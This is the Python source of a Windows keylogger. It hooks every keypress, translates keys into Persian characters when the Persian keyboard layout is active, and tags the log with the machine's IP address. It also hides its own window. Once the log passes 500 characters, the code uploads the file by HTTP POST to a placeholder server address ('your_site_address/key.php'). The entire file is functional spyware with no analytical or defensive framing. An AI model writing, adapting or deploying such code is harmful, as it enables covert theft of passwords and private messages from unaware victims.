import keyboard
import requests
import socket
import ctypes
import win32api
import win32con
import win32gui

ip = socket.gethostbyname(socket.gethostname())
dir = r'C:/log.log'

with open(dir, 'a+', encoding="UTF-8") as f:
    f.write(f" <-{ip}-> ")
    f.close()
    
def get_keyboard_language():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    thread_id = user32.GetWindowThreadProcessId(user32.GetForegroundWindow(), 0)
    klid = win32api.GetKeyboardLayout(thread_id)
    lang_id = klid & 0xFFFF
    languages = {
        0x0409: 'En',
        0x0429: 'Pr',
    }
    lang = languages.get(lang_id, 'Unknown')
    return lang

persian_to_english_chars = {
    "q": "ض", "w": "ص", "e": "ث", "r": "ق", "t": "ف", "y": "غ", "u": "ع", "i": "ه", "o": "خ", "p": "ح", 
    "g": "ل", "c": "ز", "a": "ش", "s": "س", "d": "ی", "f": "ب", "h": "ا", "j": "ت", "k": "ن", 
    "l": "م", ";": "ک", "'": "گ", "]": "پ", "z": "ظ", "x": "ط", "v": "ر", "b": "ذ", "n": "د", "m": "ئ", ",": "و"
}

def on_key_press(event):
    current_language = get_keyboard_language()
    with open(dir, 'a+', encoding="UTF-8") as f:
        ignored_keys = ("esc", "tab", "caps lock", "shift", "ctrl", "left windows", "alt", 
                        "right alt", "right ctrl", "left", "up", "down", "right", "right shift", "delete")
        if event.name in ignored_keys:
            f.write("")
        elif event.name == "space":
            f.write(" ")
        elif event.name == "enter":
            f.write(f"\n")
        elif event.name == "backspace":
            try:
                f.close()
                with open(dir, 'r+', encoding="UTF-8") as f:
                    data = f.readlines()
                    data = data[0]
                    f.close()
                with open(dir, 'w+', encoding="UTF-8") as f:
                    f.write(data[:-1])
                    f.close()
            except:
                ...
        else:
            if current_language == 'Pr' and event.name in persian_to_english_chars:
                f.write(f"{persian_to_english_chars[event.name]}")
            else:
                f.write(event.name)
            
            try:
                f.close()
                with open(dir, 'r+', encoding="UTF-8") as f:
                    data = f.readlines()
                    if len(data) > 0:
                        data = data[0]
                    f.close()
                if len(data) > 500:
                    files = {'file': open(dir, 'rb')}
                    r = requests.post("https://your_site_address/key.php", files=files, timeout=2)
                    f.close()
                    with open(dir, 'w+', encoding="UTF-8") as f:
                        f.write(f" <-{ip}-> ")
                        f.close()
            except:
                ...
                
the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)

keyboard.on_press(on_key_press)
keyboard.wait()
